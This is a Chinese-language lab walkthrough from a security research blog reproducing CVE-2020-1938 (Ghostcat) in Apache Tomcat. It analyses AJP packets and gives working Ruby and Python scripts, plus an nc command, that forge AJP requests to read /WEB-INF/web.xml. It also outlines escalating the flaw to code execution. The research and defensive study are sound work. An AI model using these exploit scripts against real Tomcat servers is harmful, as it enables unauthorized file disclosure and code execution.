**作者： xax007@知道创宇404 ScanV安全服务团队**  
**作者博客：<https://xax007.github.io/2020/02/25/Apache-Tomcat-AJP-LFI-and-LCE-CVE-2020-1938-Walkthrough.html>**

看到[CVE-2020-1938:Tomcat AJP
文件包含漏洞分析](https://mp.weixin.qq.com/s/Y05EOzMhyztogNtL41MNNw)文章决定参考漏洞代码的同时从 AJP
协议入手重现此漏洞

通过链接中的文章可知本次漏洞产生的原因是:

**由于 Tomcat 在处理 AJP 请求时,未对请求做任何验证, 通过设置 AJP 连接器封装的 request 对象的属性,
导致产生任意文件读取漏洞和代码执行漏洞**

设置 request 对象的那几个属性呢? 下面这三个:

  * javax.servlet.include.request_uri
  * javax.servlet.include.path_info
  * javax.servlet.include.servlet_path

也就是说 **我们只要构造 AJP 请求, 在请求是定义这三个属性就可以触发此漏洞**

此前了解到 Apache HTTP Server 可反向代理 AJP 协议,因此决定从此处入手.

## 搭建 Apache Tomcat 服务

首先从官网下载了存在漏洞的版本 `apache-tomcat-9.0.30`, 并在 Ubuntu Server 18.04 虚拟机中运行

    
    
    unzip apache-tomcat-9.0.30.zip
    cd apache-tomcat-9.0.30/bin
    chmod +x *.sh
    ./startup.sh

Tomcat 启动以后可以发现系统多监听了三个端口, 8050, 8080, 8009

![netstat -tln show new 3 open ports: 8050 8080
8009](https://images.seebug.org/content/images/2020/03/18/1584510991000-1uvwit.png-w331s)

通过查看 Tomcat 目录下的 `conf/server.xml` 文件可以看到以下两行(多余内容已省略)

    
    
    ...
    <Connector port="8080" protocol="HTTP/1.1"
    ...
    <Connector port="8009" protocol="AJP/1.3" redirectPort="8443" />
    ...

从这两行可以看出定义了 8080 端口上 是 HTTP 协议, 而 8009 端口就是本篇的主角 AJP协议的通信接口

**HTTP协议：** 连接器监听 8080 端口，负责建立HTTP连接。在通过浏览器访问 Tomcat 服务器的Web应用时，使用的就是这个连接器。  
**AJP协议：** 连接器监听 8009 端口，负责和其他的HTTP服务器建立连接。Tomcat 与其他HTTP服务器集成时，就需要用到这个连接器。

Apache HTTP Server 的 `mod-jk` 模块可以对 AJP 协议进行反向代理,因此开始配置 Kali Linux 里的 Apache
HTTP Server.

## 安装apache http server的模块依赖

首先为了让 Apache HTTP Server 能反向代理 AJP 协议安装 `mod-jk`

    
    
    apt install libapache2-mod-jk
    a2enmod proxy_ajp

## 配置 Apache HTTP Server

在 Kali linux 的 `/etc/apache2/sites-enabled/` 目录新建一个文件, 文件名随意, 例如新建一个叫
`ajp.conf` 的文件, 内容如下

    
    
    ProxyRequests Off
    # Only allow localhost to proxy requests
    <Proxy *>
    Order deny,allow
    Deny from all
    Allow from localhost
    </Proxy>
    #  体现下面的IP地位为搭建好的 tomcat 的 IP 地址
    ProxyPass                 / ajp://192.168.109.134:8009/
    ProxyPassReverse    / ajp://192.168.109.134:8009/

重启 Apache

    
    
    systemctl start apache2

此时把虚拟机的 192.168.109.134 的 8009 通过 Apache 反向代理到了本机的 80 端口

在 Kali Linux 中开启 wireshark 抓包并配置显示过滤条件为 `ajp13`, 此条件下 wireshark 会只抓取到的 AJP
协议的包, 但为了仅看到想到的数据包, 进一步设置显示过滤条件为 `ajp13.method == 0x02`

![set wireshark protocol display filter to ajp13.method ==
0x02](https://images.seebug.org/content/images/2020/03/18/1584510991000-2dtwjx.png-w331s)

配置好 wireshark 以后, 打开浏览器访问 127.0.0.1 可以发现虽然访问的是本地回环地址,但实际上访问的是在上面配置的Apache
Tomcat, 查看 Wireshark 可以看到它已经抓取我们此次请求的数据包

![wireshark captured ajp request
packet](https://images.seebug.org/content/images/2020/03/18/1584510997000-3djezp.png-w331s)

从上面的截图中可以看到 Wireshark 能够解析 AJP 协议

## 深入浅出 AJP 协议

AJP协议全称为 Apache JServ Protocol 目前最新的版本为 1.3

AJP协议是一个二进制的TCP传输协议，相比HTTP这种纯文本的协议来说，效率和性能更高，也做了很多优化。因为是二进制协议，所以浏览器并不能直接支持
AJP13 协议

本问重点分析与本次漏洞有关的 `AJP13_FORWARD_REQUEST` 请求格式, 分析 wireshark
抓取到的数据包后理解格式并构造特定数据包进行漏洞利用

关于 AJP 协议的更多信息请查看 [官方文档](https://tomcat.apache.org/connectors-doc-archive/jk2/common/AJPv13.html)

Apache JServ Protocol(AJP) 协议的 `AJP13_FORWARD_REQUEST` 请求通过分析数据化分析出由以下几个部分组成

AJP MAGIC (1234) AJP DATA LENGTH AJP DATA AJP END (ff)

在 Wireshark 中选中上面截图中的 `REQ:GET` 包的AJP协议部分, 右键选择 `copy` -> `... as a Hex Stram`
粘贴在任意位置查看, 我的数据包如下

![copy packet as hex
stream](https://images.seebug.org/content/images/2020/03/18/1584511003000-4jopqk.png-w331s)

    
    
    1234016302020008485454502f312e310000012f0000093132372e302e302e310000096c6f63616c686f73740000093132372e302e302e31000050000007a00b00093132372e302e302e3100a00e00444d6f7a696c6c612f352e3020285831313b204c696e7578207838365f36343b2072763a36382e3029204765636b6f2f32303130303130312046697265666f782f36382e3000a001003f746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c2a2f2a3b713d302e3800a004000e656e2d55532c656e3b713d302e3500a003000d677a69702c206465666c61746500a006000a6b6565702d616c697665000019557067726164652d496e7365637572652d526571756573747300000131000a000f414a505f52454d4f54455f504f52540000053539303538000a000e414a505f4c4f43414c5f414444520000093132372e302e302e3100ff

按照上文中的格式:

  * 前四个字节 `1234` 为 `AJP MAGIC`
  * `0163` 为 `AJP DATA LENGTH` ,这个值是怎么来的呢?

用 python 代码可以计算出 `AJP DATA LENGTH` 为: 完整的数据包去掉 `AJP MAGIC` 和最后的 `0xff`
结束标志之前的数据长度,也就是下图中选中部分数据的长度

![python code:
hex\(len\(binascii.unhexlify\(packet\)\[2:-2\]\)\)](https://images.seebug.org/content/images/2020/03/18/1584511010000-5riemw.png-w331s)

我们需要关注的是第三章图最后两行,也就是下面这两行

    
    
    AJP_REMOTE_PORT: 59058
    AJP_LOCAL_ADDR: 127.0.0.1

在 Wireshark 中复制(选中该行右键copy-> as hex stream) 出 16 进制字符串为:

    
    
    0a000f414a505f52454d4f54455f504f5254000005353930353800       # AJP_REMOTE_PORT: 59058
    0a000e414a505f4c4f43414c5f414444520000093132372e302e302e3100 # AJP_LOCAL_ADDR: 127.0.0.1

这些字符串怎么构造的呢?

`0a00` 是`request_header`的标志, 表示后面的数据是 `request_header`. 在官方文档有写 `0f` 是
`request_header` 的长度

![header1 = '0a000f414a505f52454d4f54455f504f5254000005353930353800'
hex\(len\(binascii.unhexlify\(b'414a505f52454d4f54455f504f5254'\)\)\)](https://images.seebug.org/content/images/2020/03/18/1584511014000-6hayuz.png-w331s)`414a505f52454d4f54455f504f5254`
是 `AJP_REMOTE_PORT`

`0000` 用来分割请求头名称和值

`053539303538` 是 `59058` 的 16 进制 `00` 表示结束

关键的字节是怎么构造的已经明白了, 那现在只要把 Wireshark 中抓取到的数据包修改一下, 把

    
    
    AJP_REMOTE_PORT: 59058
    AJP_LOCAL_ADDR: 127.0.0.1

按照二进制数据格式替换成

    
    
    javax.servlet.include.request_uri: /WEB-INF/web.xml
    javax.servlet.include.path_info: web.xml
    javax.servlet.include.servlet_path: /WEB-INF/

在修改 `AJP DATA LENGTH` 为正确的大小即可

因此编写了代码构造了原始请求的 16 进制数据然后通过 nc 发送成功触发漏洞

ruby 版

    
    
    AJP_MAGIC = '1234'
    AJP_REQUEST_HEADER = '02020008485454502f312e310000012f0000093132372e302e302e310000096c6f63616c686f73740000093132372e302e302e31000050000007a00b00093132372e302e302e3100a00e00444d6f7a696c6c612f352e3020285831313b204c696e7578207838365f36343b2072763a36382e3029204765636b6f2f32303130303130312046697265666f782f36382e3000a001003f746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c2a2f2a3b713d302e3800a004000e656e2d55532c656e3b713d302e3500a003000d677a69702c206465666c61746500a006000a6b6565702d616c697665000019557067726164652d496e7365637572652d52657175657374730000013100'
    
    def pack_attr(s)
        ## return len(s) + unhex(s)
        return s.length.to_s(16).to_s.rjust(2, "0") + s.unpack("H*")[0]
    end
    
    attribute = Hash[
        'javax.servlet.include.request_uri' => '/WEB-INF/web.xml',
        'javax.servlet.include.path_info' => 'web.xml',
        'javax.servlet.include.servlet_path' => '/WEB-INF/']
    
    
    req_attribute = ""
    attribute.each do |key, value|
        req_attribute += '0a00' + pack_attr(key) + '0000' + pack_attr(value) + '00'
    end
    
    AJP_DATA = AJP_REQUEST_HEADER + req_attribute + 'ff'
    AJP_DATA_LENGTH = (AJP_DATA.length / 2).to_s(16).to_s.rjust(4, "0")
    AJP_FORWARD_REQUEST = AJP_MAGIC + AJP_DATA_LENGTH + AJP_DATA
    
    puts AJP_FORWARD_REQUEST

python版

    
    
    import binascii
    
    AJP_MAGIC = '1234'.encode()
    
    AJP_HEADER = b'02020008485454502f312e310000062f312e7478740000093132372e302e302e310000096c6f63616c686f73740000093132372e302e302e31000050000007a00b00093132372e302e302e3100a00e00444d6f7a696c6c612f352e3020285831313b204c696e7578207838365f36343b2072763a36382e3029204765636b6f2f32303130303130312046697265666f782f36382e3000a001003f746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c2a2f2a3b713d302e3800a004000e656e2d55532c656e3b713d302e3500a003000d677a69702c206465666c61746500a006000a6b6565702d616c697665000019557067726164652d496e7365637572652d52657175657374730000013100'
    
    def unhex(hex):
        return binascii.unhexlify(hex)
    def pack_attr(attr):
        attr_length = hex(len(attr))[2:].encode().zfill(2)
        return attr_length + binascii.hexlify(attr.encode())
    
    attribute = {
        'javax.servlet.include.request_uri': '/WEB-INF/web.xml',
        'javax.servlet.include.path_info': 'web.xml',
        'javax.servlet.include.servlet_path': '/WEB-INF/',
    }
    
    req_attribute = b''
    for key,value in attribute.items():
        key_length = hex(len(key))[2:].encode().zfill(2)
        value_length = hex(len(value))[2:].encode().zfill(2)
        req_attribute += b'0a00' + pack_attr(key) + b'0000' + pack_attr(value) + b'00'
    
    
    AJP_DATA = AJP_HEADER + req_attribute + b'ff'
    AJP_DATA_LENGTH = hex(len(binascii.unhexlify(AJP_DATA)))[2:].zfill(4)
    AJP_FORWARD_REQUEST = AJP_MAGIC + AJP_DATA_LENGTH.encode() + AJP_DATA
    print(AJP_FORWARD_REQUEST)

测试一下

    
    
    ruby ajp-exp.rb | xxd -r -p | nc -v 172.16.19.171 8009

![img](https://images.seebug.org/content/images/2020/03/18/1584511028000-7vsevq.png-w331s)

BINGO!

成功读取 `/WEB-INF/web.xml` 文件的源码

那现在怎么执行代码?

在 Tomcat `webapps/ROOT` 目录下新建一个文件 `1.txt`

然后构造那三个属性修改值为:

    
    
    javax.servlet.include.request_uri: /1.txt
    javax.servlet.include.path_info: 1.txt
    javax.servlet.include.servlet_path: /

在测试一下

    
    
    ruby ajp-exp.rb | xxd -r -p | nc -v 172.16.19.171 8009

![img](https://images.seebug.org/content/images/2020/03/18/1584511031000-8qpcws.png-w331s)

BINGO AGAIN

**参考链接**

  1. <https://tomcat.apache.org/connectors-doc-archive/jk2/common/AJPv13.html>

  2. <https://gist.github.com/xax007/97e999403baec32c84a666e6fe261072>

  3. <https://ionize.com.au/exploiting-apache-tomcat-port-8009-using-apache-jserv-protocol/>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1147/>

